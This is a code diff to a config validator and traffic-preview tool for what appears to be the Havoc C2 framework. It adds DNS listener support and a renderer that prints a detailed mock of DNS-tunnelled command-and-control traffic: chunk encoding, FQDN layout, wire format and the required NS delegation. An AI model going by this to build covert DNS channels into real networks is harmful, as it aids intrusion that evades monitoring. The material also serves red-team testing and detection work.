@@ -450,6 +450,15 @@ SCHEMA = {
         FieldSpec("Name", "string", required=True),
         FieldSpec("Endpoint", "string", required=True),
     ],
+    "Listeners.Dns": [
+        FieldSpec("Name", "string", required=True),
+        FieldSpec("Hosts", "[]string", required=False),
+        FieldSpec("HostBind", "string", required=True),
+        FieldSpec("Port", "int", required=True, validator=_validate_port),
+        FieldSpec("ZoneDomain", "string", required=True),
+        FieldSpec("QueryTimeout", "int", required=False),
+        FieldSpec("ChunkDelayMs", "int", required=False),
+    ],
     "Demon": [
         FieldSpec("Sleep", "int", required=False),
         FieldSpec("Jitter", "int", required=False),
@@ -646,6 +655,19 @@ class Validator:
             pfx = f"Listeners.External[{i}] \"{e.get('Name', '?')}\""
             self._validate_fields(e, "Listeners.External", pfx)
 
+        dns_list = listeners.get("Dns", [])
+        if not isinstance(dns_list, list):
+            dns_list = [dns_list]
+        for i, d in enumerate(dns_list):
+            pfx = f"Listeners.Dns[{i}] \"{d.get('Name', '?')}\""
+            self._validate_fields(d, "Listeners.Dns", pfx)
+            zone = d.get("ZoneDomain", "")
+            if zone and "." not in zone:
+                self._warn(pfx, f"ZoneDomain '{zone}' has no dot; must be a valid DNS zone (e.g. 'c2.example.com')")
+            port = d.get("Port", 0)
+            if isinstance(port, int) and port == 53:
+                self._warn(pfx, "Port = 53 requires root or cap_net_bind_service on Linux; consider 5353 for testing")
+
     def _validate_demon(self):
         demon = self._block("Demon")
         if demon is None:
@@ -712,6 +734,9 @@ class TrafficRenderer:
         ext_list = listeners.get("External", [])
         if not isinstance(ext_list, list):
             ext_list = [ext_list]
+        dns_list = listeners.get("Dns", [])
+        if not isinstance(dns_list, list):
+            dns_list = [dns_list]
 
         for h in http_list:
             output.append(self._render_http(h, sleep, jitter))
@@ -719,6 +744,8 @@ class TrafficRenderer:
             output.append(self._render_smb(s, sleep, jitter))
         for e in ext_list:
             output.append(self._render_external(e))
+        for d in dns_list:
+            output.append(self._render_dns(d, sleep, jitter))
 
         return "\n".join(output)
 
@@ -841,6 +868,69 @@ class TrafficRenderer:
         ]
         return "\n".join(lines)
 
+    def _render_dns(self, d: dict, sleep: int, jitter: int) -> str:
+        name = d.get("Name", "unnamed")
+        zone = d.get("ZoneDomain", "<zone>")
+        hosts = d.get("Hosts", ["<ns-ip>"])
+        port = d.get("Port", 53)
+        host_bind = d.get("HostBind", "0.0.0.0")
+        timeout = d.get("QueryTimeout", 4000)
+        chunk_delay = d.get("ChunkDelayMs", 50)
+        ns_ip = hosts[0] if hosts else "<ns-ip>"
+
+        lines = [
+            f"┌─── DNS Listener: {name} ───",
+            f"│  Zone:           {zone}",
+            f"│  HostBind:       {host_bind}:{port}  (UDP + TCP)",
+            f"│  NS IP(s):       {', '.join(hosts) if isinstance(hosts, list) else hosts}",
+            f"│  QueryTimeout:   {timeout} ms",
+            f"│  ChunkDelayMs:   {chunk_delay} ms",
+            f"│  Sleep/Jitter:   {sleep}s / {jitter}%",
+            f"│",
+            f"│  ── Mock Demon → Teamserver (uplink, A queries) ──",
+            f"│  Each 30-byte chunk of the AuthWireBuffer is base32-encoded",
+            f"│  and sent as an A-record query label:",
+            f"│",
+            f"│  DnsQuery_W(L\"nbswy3dpeb3w.00010001.deadbeef.{zone}\", DNS_TYPE_A)",
+            f"│    → 0.0.0.1  (chunk ACK)",
+            f"│  DnsQuery_W(L\"64tmmqqjv3dp.00010101.deadbeef.{zone}\", DNS_TYPE_A)",
+            f"│    → 0.0.0.1  (chunk ACK)",
+            f"│  ... (one A query per 30 bytes; a 300-byte packet = 10 queries)",
+            f"│",
+            f"│  FQDN format: <b32chunk>.<seq4><cid2><tot2>.<aid8>.<zone>",
+            f"│    seq4  = 16-bit rolling packet sequence (hex)",
+            f"│    cid2  = chunk index within this packet (hex)",
+            f"│    tot2  = total chunks for this packet (hex)",
+            f"│    aid8  = 32-bit agent ID (hex; 00000000 = registration)",
+            f"│",
+            f"│  Wire payload inside base32 (inherited from PackageTransmitAll):",
+            f"│    [4]  SIZE (BE, bit-31=LZNT1 flag)",
+            f"│    [4]  MAGIC 0xDEADBEEF (XOR'd with SIZE^0xA3F1C2B4)",
+            f"│    [4]  AgentID (XOR'd)",
+            f"│    [4]  CommandID (XOR'd)",
+            f"│    [4]  RequestID (XOR'd)",
+            f"│    [16] per-request IV",
+            f"│    [N]  AES-256-CTR encrypted payload",
+            f"│    [32] HMAC-SHA256 tag",
+            f"│",
+            f"│  ── Mock Demon → Teamserver (downlink poll, TXT queries) ──",
+            f"│  After all uplink chunks ACK'd, Demon polls for the response:",
+            f"│",
+            f"│  DnsQuery_W(L\"p.0001.0000.deadbeef.{zone}\", DNS_TYPE_TXT)",
+            f"│    → TXT \"<base64-encoded encrypted response bytes>\"",
+            f"│  Last TXT chunk is prefixed with 0xFF sentinel (stripped by agent).",
+            f"│  Empty TXT response = no data ready; agent retries after 500 ms.",
+            f"│",
+            f"│  FQDN format: p.<seq4>.<off4>.<aid8>.<zone>",
+            f"│    off4 = byte offset into queued response (hex, step = 189 bytes)",
+            f"│",
+            f"│  DNS delegation required:",
+            f"│    ns1.{zone}.  A   {ns_ip}",
+            f"│    {zone}.      NS  ns1.{zone}.",
+            f"└───",
+        ]
+        return "\n".join(lines)
+
     def _render_external(self, e: dict) -> str:
         name = e.get("Name", "unnamed")
         ep = e.get("Endpoint", "<endpoint>")
@@ -942,6 +1032,7 @@ def main():
     n_http = len(listeners.get("Http") or [])
     n_smb = len(listeners.get("Smb") or [])
     n_ext = len(listeners.get("External") or [])
+    n_dns = len(listeners.get("Dns") or [])
     demon = (tree.get("Demon") or [{}])[0]
 
     ts = (tree.get("Teamserver") or [{}])[0]
@@ -954,11 +1045,12 @@ def main():
     print(f"    HTTP listeners:     {n_http}")
     print(f"    SMB listeners:      {n_smb}")
     print(f"    External listeners: {n_ext}")
+    print(f"    DNS listeners:      {n_dns}")
     print(f"    Demon sleep/jitter: {demon.get('Sleep',2)}s / {demon.get('Jitter',15)}%")
     print()
 
     # --- Mock traffic ---
-    if show_traffic and (n_http + n_smb + n_ext) > 0:
+    if show_traffic and (n_http + n_smb + n_ext + n_dns) > 0:
         print(f"  Mock traffic preview:")
         print()
         renderer = TrafficRenderer(tree)
